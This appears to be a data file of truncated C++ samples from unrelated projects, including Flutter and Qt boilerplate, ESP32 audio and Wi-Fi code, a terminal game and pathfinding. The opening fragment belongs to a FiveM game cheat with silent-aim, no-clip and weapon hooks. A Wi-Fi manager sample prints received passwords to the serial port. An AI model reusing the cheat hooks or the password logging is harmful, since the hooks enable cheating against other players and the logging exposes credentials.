Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"cubit_counter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/****************************************************************************\n** Meta object code from reading C++ file 'widget.h'\n**\n** Created by: The Qt Meta Object Compiler version 67 (Qt 5.14.2)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../../Opacity/widget.h\"\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'widget.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 67\n#error \"This file was generated using the moc from 5.14.2. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_Widget_t {\n    QByteArrayData data[4];\n    char stringdata0[60];\n};\n#define QT_MOC_LITERAL(idx, ofs, len) \\\n    Q_STATIC_BYTE_ARRAY_DATA_HEADER_INITIALIZER_WITH_OFFSET(len, \\\n    qptrdiff(offsetof(qt_meta_stringdata_Widget_t, stringdata0) + ofs \\\n        - idx * sizeof(QByteArrayData)) \\\n    )\nstatic const qt_meta_stringdata_Widget_t qt_meta_stringdata_Widget = {\n    {\nQT_MOC_LITERAL(0, 0, 6), // \"Widget\"\nQT_MOC_LITERAL(1, 7, 24), // \"on_pushButton_up_clicked\"\nQT_MOC_LITERAL(2, 32, 0), // \"\"\nQT_MOC_LITERAL(3, 33, 26) // \"on_pushButton_down_clicked\"\n\n    },\n    \"Widget\\0on_pushButton_up_clicked\\0\\0\"\n    \"on_pushButton_down_clicked\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_Widget[] = {\n\n // content:\n       8,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       2,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags\n       1,    0,   24,    2, 0x08 /* Private */,\n       3,    0,   25,    2, 0x08 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nvoid Widget::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<Widget *>(_o);\n        Q_UNUSED(_t)\n        switch (_id) {\n        case 0: _t->on_pushButton_up_clicked(); break;\n        case 1: _t->on_pushButton_down_clicked(); break;\n        default: ;\n        }\n    }\n    Q_UNUSED(_a);\n}\n\nQT_INIT_METAOBJECT const QMetaObject Widget::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_Widget.data,\n    qt_meta_data_Widget,\n    qt_static_metacall,\n    nullptr,\n    nullptr\n} };\n\n\nconst QMetaObject *Widget::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *Widget::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_Widget.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint Widget::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QWidget::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 2)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 2;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 2)\n            *reinterpret_cast<int*>(_a[0]) = -1;\n        _id -= 2;\n    }\n    return _id;\n}\nQT_WARNING_POP\nQT_END_MOC_NAMESPACE\n",
    "#include \"AudioFeature\"\n// Hz to Mel conversion\nfloat hz_to_mel(float hz)\n{\n    return 2595 * log10(1 + hz / 700);\n}\n\n// Mel to Hz conversion\nfloat mel_to_hz(float mel)\n{\n    return 700 * (pow(10, mel / 2595) - 1);\n}\ntemplate <typename T>\nT abs(T r, T i)\n{\n    return sqrt(r * r + i * i);\n}\n\n\nAudioFeature::AudioFeature(int Sample_rate, int stft_length, int stft_step, int num_mel_bins, int audio_length, int lower_hz, int upper_hz)\n{\n    this->Sample_rate = Sample_rate;\n    this->stft_length = stft_length;\n    this->stft_step = stft_step;\n    this->num_mel_bins = num_mel_bins;\n    this->audio_length = audio_length;\n    this->lower_hz = lower_hz;\n    this->upper_hz = upper_hz;\n    this->nfft = this->stft_length / 2 + 1;\n    this->nframes = (this->audio_length - this->stft_length) / this->stft_step + 1;\n    this->fft_r = (float *)heap_caps_malloc(sizeof(float) * this->stft_length, MALLOC_CAP_SPIRAM);\n    this->fft_i = (float *)heap_caps_malloc(sizeof(float) * this->stft_length, MALLOC_CAP_SPIRAM);\n    this->stft_matrix = (float **)heap_caps_malloc(sizeof(float *) * this->nframes, MALLOC_CAP_SPIRAM);\n    this->audio= (float *)heap_caps_malloc(sizeof(float) * this->audio_length, MALLOC_CAP_SPIRAM);\n    memset(this->audio, 0, sizeof(float) * this->audio_length);\n    for (int i = 0; i < this->nframes; i++)\n    {\n        this->stft_matrix[i] = (float *)heap_caps_malloc(sizeof(float) * this->stft_length, MALLOC_CAP_SPIRAM);\n        memset(this->stft_matrix[i], 0, sizeof(float) * this->stft_length);\n    }\n    this->output_matrix = (float *)heap_caps_malloc(sizeof(float) * this->nframes * this->num_mel_bins, MALLOC_CAP_SPIRAM);\n    // for (int i = 0; i < this->nframes; i++)\n    // {\n    //     this->output_matrix[i] = (float *)heap_caps_malloc(sizeof(float) * this->num_mel_bins, MALLOC_CAP_SPIRAM);\n    //     memset(this->output_matrix[i], 0, sizeof(float) * this->num_mel_bins);\n    // }\n    this->_filter_bank = (float **)heap_caps_malloc(sizeof(float *) * this->nfft, MALLOC_CAP_SPIRAM);\n    for (int i = 0; i < this->nfft; i++)\n    {\n        this->_filter_bank[i] = (float *)heap_caps_malloc(sizeof(float) * this->num_mel_bins, MALLOC_CAP_SPIRAM);\n        memset(this->_filter_bank[i], 0, sizeof(float) * this->num_mel_bins);\n    }\n    this->_generate_filter_bank();\n}\n\nvoid AudioFeature::compute()\n{\n    //this->_normallize_audio();\n    this->_stft();\n    this->_mel();\n    #ifdef DEBUG\n    float max_audio = 0;\n    float max_stft = 0;\n    float output_max = 0;\n    for (int i = 0; i < this->audio_length; i++)\n    {\n        if (this->audio[i] > max_audio)\n        {\n            max_audio = this->_audio[i];\n        }\n    }\n    for (int i = 0; i < this->nframes; i++)\n    {\n        for (int j = 0; j < this->nfft; j++)\n        {\n            if (this->stft_matrix[i][j] > max_stft)\n            {\n                max_stft = this->stft_matrix[i][j];\n            }\n        }\n    }\n    for (int i = 0; i < this->nframes; i++)\n    {\n        for (int j = 0; j < this->num_mel_bins; j++)\n        {\n            if (this->output_matrix[i][j] > output_max)\n            {\n                output_max = this->output_matrix[i][j];\n            }\n        }\n    }\n    \n    printf(\"max audio: %f, max stft: %f\\n, max output: %f\\n\", max_audio, max_stft, output_max);\n    // print shape of all matrix\n    printf(\"audio: %d\\n\", this->audio_length);\n    printf(\"stft: %d, %d\\n\", this->nframes, this->nfft);\n    printf(\"mel: %d, %d\\n\", this->nframes, this->num_mel_bins);\n    printf(\"filter bank: %d, %d\\n\", this->nfft, this->num_mel_bins);\n    printf(\"output: %d, %d\\n\", this->nframes, this->num_mel_bins);\n    #endif\n}\n\n\nvoid AudioFeature::_stft()\n{\n    ArduinoFFT<float> FFT = ArduinoFFT<float>(this->fft_r, this->fft_i, this->stft_length, this->Sample_rate, 0);\n    //FFT.windowing(this->audio,this->audio_length,FFTWindow::Hann, FFTDirection::Forward);\n    for (int i = 0; i < this->nframes; i++)\n    {\n        memset(this->stft_matrix[i], 0, sizeof(float) * this->nfft);\n        memset(this->fft_i, 0, sizeof(float) * this->stft_length);\n        memset(this->fft_r, 0, sizeof(float) * this->stft_length);\n        if (i * this->stft_step + this->stft_length <= this->audio_length)\n        {\n            memcpy(this->fft_r, this->audio+ i * this->stft_step, sizeof(float) * this->stft_length);\n        }\n        else\n        {\n    #ifdef DEBUG\n            printf(\"cpy_len: %d\\n\", this->audio_length - i * this->stft_step);\n    #endif\n            int cpy_len;\n            cpy_len = this->audio_length - i * this->stft_step;\n            memcpy(this->fft_r, this->audio+ i * this->stft_step, sizeof(float) * cpy_len);\n        }\n        FFT.compute(FFTDirection::Forward);\n        for (int j = 0; j < this->nfft; j++)\n        {\n            this->stft_matrix[i][j] = abs(this->fft_r[j], this->fft_i[j]);\n        }\n    }\n}\n\nvoid AudioFeature::_mel()\n{\n    for (int i = 0; i < this->nframes; i++)\n    {\n        for (int j = 0; j < this->num_mel_bins; j++)\n        {\n            float sum = 0;\n          ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mental_in\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"WiFiManager.h\"\n\nWiFiManager::WiFiManager(TimeManager* tm) : timeManager(tm) {}\n\nvoid WiFiManager::connect(const char* ssid, const char* password) {\n  Serial.println(\"Connecting to WiFi...\");\n  WiFi.begin(ssid, password);\n\n  while (WiFi.status() != WL_CONNECTED) {\n    delay(1000);\n    Serial.println(\"Establishing connection to WiFi...\");\n  }\n\n  Serial.println(\"Connected to WiFi.\");\n}\n\nbool WiFiManager::isConnected() {\n  return WiFi.status() == WL_CONNECTED;\n}\n\nvoid WiFiManager::attemptReconnect() {\n  if (!isConnected()) {\n    Serial.println(\"Reconnecting to WiFi...\");\n    WiFi.reconnect();\n    delay(5000);\n\n    if (isConnected()) {\n      Serial.println(\"Reconnected to WiFi.\");\n    } else {\n      Serial.println(\"Failed to reconnect to WiFi.\");\n    }\n  }\n}\n\nvoid WiFiManager::saveConfiguration(const char* ssid, const char* password){\n    Preferences prefs;\n    prefs.begin(\"wifi\", false); // Open with write access\n    prefs.putString(\"ssid\", ssid);\n    prefs.putString(\"password\", password);\n    prefs.end();\n}\n\nvoid WiFiManager::forgetConfiguration() {\n    preferences.begin(\"wifi\", false); // \"wifi\" is the namespace for our WiFi settings\n    preferences.clear(); // Clear all preferences within the \"wifi\" namespace\n    preferences.end(); // Always call end to close the Preferences\n    Serial.println(\"WiFi configuration forgotten.\");\n}\n\nvoid WiFiManager::tryConnectStoredWifi() {\n    preferences.begin(\"wifi\", true); // Open the Preferences with read-only access\n    String ssid = preferences.getString(\"ssid\", \"\");\n    String password = preferences.getString(\"password\", \"\");\n    preferences.end();\n\n    if (ssid != \"\" && password != \"\") {\n        Serial.println(\"Trying to connect with stored credentials...\");\n        connect(ssid.c_str(), password.c_str());\n    } else {\n        Serial.println(\"No stored WiFi credentials found.\");\n    }\n}\n\nvoid WiFiManager::initiateProvisioning(const char* service_name, const char* pop) {\n  Serial.println(\"Initiating WiFi provisioning...\");\n\n  WiFi.mode(WIFI_STA);\n\n  WiFiProv.beginProvision(WIFI_PROV_SCHEME_BLE, WIFI_PROV_SCHEME_HANDLER_FREE_BTDM, WIFI_PROV_SECURITY_1, pop, service_name, NULL, NULL, true);\n  while (!isConnected()) {\n    delay(1000);\n    Serial.println(\"Waiting for provisioning...\");\n  }\n\n  if (timeManager && !timeManager->isTimeSynced()) {\n      timeManager->begin();\n      timeManager->update();\n  }\n  \n  Serial.println(\"Provisioning done. WiFi connected.\");\n}\n\nvoid WiFiManager::setupEventHandling() {\n  WiFi.onEvent(SysProvEvent);\n}\n\nvoid WiFiManager::SysProvEvent(arduino_event_t *sys_event) {\n    switch (sys_event->event_id) {\n    case ARDUINO_EVENT_WIFI_STA_GOT_IP:\n        Serial.print(\"\\nConnected IP address : \");\n        Serial.println(IPAddress(sys_event->event_info.got_ip.ip_info.ip.addr));\n        // Modify LED logic as needed or call another method within WiFiManager\n\n        break;\n    case ARDUINO_EVENT_PROV_CRED_RECV: {\n        Serial.println(\"\\nReceived Wi-Fi credentials\");\n        saveConfiguration((const char *) sys_event->event_info.prov_cred_recv.ssid, (char const *) sys_event->event_info.prov_cred_recv.password);\n        Serial.print(\"\\tSSID : \");\n        Serial.println((const char *) sys_event->event_info.prov_cred_recv.ssid);\n        Serial.print(\"\\tPassword : \");\n        Serial.println((char const *) sys_event->event_info.prov_cred_recv.password);\n        break;\n    }\n    case ARDUINO_EVENT_PROV_START:\n        Serial.println(\"\\nProvisioning started\\nGive Credentials of your access point using smartphone app\");\n        // Handle provisioning start event\n        break;\n    // Handle other events similarly\n    default:\n        break;\n    }\n}",
    "#include <array>\n#include <chrono>\n#include <iostream>\n#include <math.h>\n#include <random>\n#include <string>\n#include <termios.h>\n#include <thread>\n#include <unistd.h>\n#include <vector>\n\n#define PI 3.14159265358979323846264338\n\nvoid restrictToRange(int width, int height, int &x, int &y){\n    if (x < 0){\n        x = 0;\n    }\n    if (x >= width){\n        x = width - 1;\n    }\n    if (y < 0){\n        y = 0;\n    }\n    if (y >= height){\n        y = height - 1;\n    }\n}\n\nbool testRange(int width, int height, int x, int y){\n    return (x >= 0) && (x < width) && (y >= 0) && (y < height);\n}\n\nvoid mygotoxy(short x, short y){\n    std::cout << \"\\033[\" << y << ';' << x << 'H';\n}\n\nchar mygetch() {\n    char buf = 0;\n    auto old = termios{};\n    if (tcgetattr(0, &old) < 0) {\n        throw std::runtime_error(\"tcgetattr failed\");\n    }\n    old.c_lflag &= ~ICANON;\n    old.c_lflag &= ~ECHO;\n    old.c_cc[VMIN] = 1;\n    old.c_cc[VTIME] = 0;\n    if (tcsetattr(0, TCSANOW, &old) < 0) {\n        throw std::runtime_error(\"tcsetattr failed\");\n    }\n    if (read(0, &buf, 1) < 0) {\n        throw std::runtime_error(\"read failed\");\n    }\n    old.c_lflag |= ICANON;\n    old.c_lflag |= ECHO;\n    if (tcsetattr(0, TCSADRAIN, &old) < 0) {\n        throw std::runtime_error(\"tcsetattr failed the second time\");\n    }\n    return buf;\n}\n\nclass Color {\npublic:\n    static Color BLACK;\n    static Color RED;\n    static Color GREEN;\n    static Color YELLOW;\n    static Color BLUE;\n    static Color MAGENTA;\n    static Color CYAN;\n    static Color WHITE;\n    static Color GREY;\n    static Color BRIGHT_RED;\n    static Color BRIGHT_GREEN;\n    static Color BRIGHT_YELLOW;\n    static Color BRIGHT_BLUE;\n    static Color BRIGHT_MAGENTA;\n    static Color BRIGHT_CYAN;\n    static Color BRIGHT_WHITE;\n\n    std::uint8_t colorDigit() const noexcept {\n        return this->m_colorDigit;\n    }\n\n    bool isBright() const noexcept {\n        return this->m_isBright;\n    }\n\nprivate:\n    Color(std::uint8_t colorDigit, bool isBright) noexcept\n        : m_colorDigit(colorDigit)\n        , m_isBright(isBright)\n    {}\n\n    std::uint8_t m_colorDigit;\n    bool m_isBright;\n};\n\nColor Color::BLACK = Color(0, false);\nColor Color::RED = Color(1, false);\nColor Color::GREEN = Color(2, false);\nColor Color::YELLOW = Color(3, false);\nColor Color::BLUE = Color(4, false);\nColor Color::MAGENTA = Color(5, false);\nColor Color::CYAN = Color(6, false);\nColor Color::WHITE = Color(7, false);\nColor Color::GREY = Color(0, true);\nColor Color::BRIGHT_RED = Color(1, true);\nColor Color::BRIGHT_GREEN = Color(2, true);\nColor Color::BRIGHT_YELLOW = Color(3, true);\nColor Color::BRIGHT_BLUE = Color(4, true);\nColor Color::BRIGHT_MAGENTA = Color(5, true);\nColor Color::BRIGHT_CYAN = Color(6, true);\nColor Color::BRIGHT_WHITE = Color(7, true);\n\n\nvoid textColor(Color bg_color, Color text_color){\n    auto bg_code = 40 + bg_color.colorDigit() + (bg_color.isBright() ? 60 : 0);\n    auto text_code = 30 + text_color.colorDigit() + (text_color.isBright() ? 60 : 0);\n    std::cout << \"\\033[\" << bg_code << \"m\\033[\" << text_code << 'm';\n}\n\nvoid clearScreen(){\n    textColor(Color::BLACK, Color::WHITE);\n    std::cout << \"\\033[2J\";\n}\n\nvoid drawLine(int start_x, int start_y, int end_x, int end_y, char const* symbol, Color symbol_color){\n    textColor(Color::BLACK, symbol_color);\n    int distance = ((end_x - start_x) + (end_y - start_y));\n    for (int i = 0; i <= distance; i++){\n        int symbol_x = start_x + ((i * (end_x - start_x)) / distance);\n        int symbol_y = start_y + ((i * (end_y - start_y)) / distance);\n        mygotoxy(symbol_x, symbol_y);\n        std::cout << symbol;\n    }\n}\n\nvoid drawBox(int sx, int sy, int ex, int ey, char const* symbol, Color symbol_color, char const* title, bool empty = false){\n    drawLine(sx, sy, sx, ey, symbol, symbol_color);\n    drawLine(sx, sy, ex, sy, symbol, symbol_color);\n    drawLine(ex, sy, ex, ey, symbol, symbol_color);\n    drawLine(sx, ey, ex, ey, symbol, symbol_color);\n    if (empty){\n        for (int box_x = 1; box_x < ex - sx; box_x++){\n            for (int box_y = 1; box_y < ey - sy; box_y++){\n                mygotoxy(sx + box_x, sy + box_y);\n                std::cout << \" \";\n            }\n        }\n    }\n    mygotoxy(sx + 1, sy);\n    std::cout << title;\n}\n\ntemplate<size_t width, size_t height>\nvoid generateWorld(std::array<std::array<int, height>, width>& terrain) {\n    //turn everything into grass\n    for (int x = 0; x < width; x++){\n        for (int y = 0; y < height; y++){\n            terrain.at(x).at(y) = 2;\n        }\n    }\n\n    //add patches of sand\n    for (int i = 0; i <= 50; i++){\n        int x = rand() % width, y = rand() % height;\n        for (int j = 0; j <= 10; j++){\n            restrictToRange(width, height, x, y);\n            int temp_x, temp_y;\n            double degrees;\n\n            for (int size = 1; size <= rand() % 5; size++){\n                for (int k = 0; k <= size * PI; k++){\n                    degrees = k * 360 / size * PI;\n                    temp_x = x + (siz",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\n    This Source Code Form is subject to the terms of the Mozilla Public\n    License, v. 2.0. If a copy of the MPL was not distributed with this\n    file, You can obtain one at https://mozilla.org/MPL/2.0/.\n*/\n\n#include <proxima/proxima.hpp>\n\n#include <cmath>\n#include <list>\n\nusing namespace proxima;\n\nvoid MovementDirection::fromVector(float x, float y)\n{\n    dir = 0;\n    if (std::abs(x) > 0.0f)\n    {\n        dir |= (uint8_t)Direction::X;\n        if (x < 0.0f)\n            dir |= (uint8_t)Direction::InvertX;\n    }\n    if (std::abs(y) > 0.0f)\n    {\n        dir |= (uint8_t)Direction::Y;\n        if (y < 0.0f)\n            dir |= (uint8_t)Direction::InvertY;\n    }\n}\n\nfloat MovementDirection::getAngle() const\n{\n    float x = dir & (uint8_t)Direction::X ? 1.0f : 0.0f;\n    if (dir & (uint8_t)Direction::InvertX) x = -x;\n    float y = dir & (uint8_t)Direction::Y ? 1.0f : 0.0f;\n    if (dir & (uint8_t)Direction::InvertY) y = -y;\n\n    return std::atan2(y, x);\n}\n\nbool MovementDirection::hasMagnitude() const\n{\n    return (dir & (uint8_t)Direction::X) || (dir & (uint8_t)Direction::Y);\n}\n\nstd::tuple<bool, uint16_t> getDirectPathLow(const Grid<uint8_t> *costField, int x0, int y0, int x1, int y1)\n{\n    uint16_t totalCost = 0;\n\n    int dx = x1 - x0;\n    int dy = y1 - y0;\n\n    int yi = 1;\n    if (dy < 0)\n    {\n        yi = -1;\n        dy = -dy;\n    }\n    int D = (2 * dy) - dx;\n    int y = y0;\n\n    for (int x = x0; x <= x1; x++)\n    {\n        uint8_t cost = (*costField)(x, y);\n        if (cost == 255) return { false, totalCost };\n        totalCost += cost;\n        if (D > 0)\n        {\n            y += yi;\n            D += (2 * (dy - dx));\n        }\n        else\n        {\n            D += 2*dy;\n        }\n    }\n\n    return { true, totalCost };\n}\n\nstd::tuple<bool, uint16_t> 